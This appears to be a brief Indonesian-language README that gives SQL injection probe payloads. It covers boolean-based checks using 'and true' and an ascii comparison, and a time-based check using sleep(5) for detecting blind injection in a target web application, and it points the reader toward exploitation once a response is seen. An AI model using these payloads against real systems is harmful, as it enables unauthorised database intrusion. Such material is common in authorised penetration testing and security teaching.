# SQL_Blind-Injection
Cek kerentenan Terlebih Dahulu dengan mengetikan :
123(datavalid)' and true -- -  Untuk Blind Injection saja
123(data valid)' and ascii('a') = 97 -- -   Untuk Blind Injection saja
------------------------------
cek kerentanan jika terdapat blind_time_injection
123(datavalid)' and if(1=1, sleep(5), false) -- -
Kode diatas dimana  bila benar maka akan menjalankan fungsi sleep selama 5 detik  usahakan jika  respond dari target web anda lambat sebaiknya diperbesar lagi  fungsi sleepnya.


jika mendapatkan suatu Respond saat menajalankan kode diatas silahkan kamu gunakan ekploitasi blind_injection/blind_time_injection
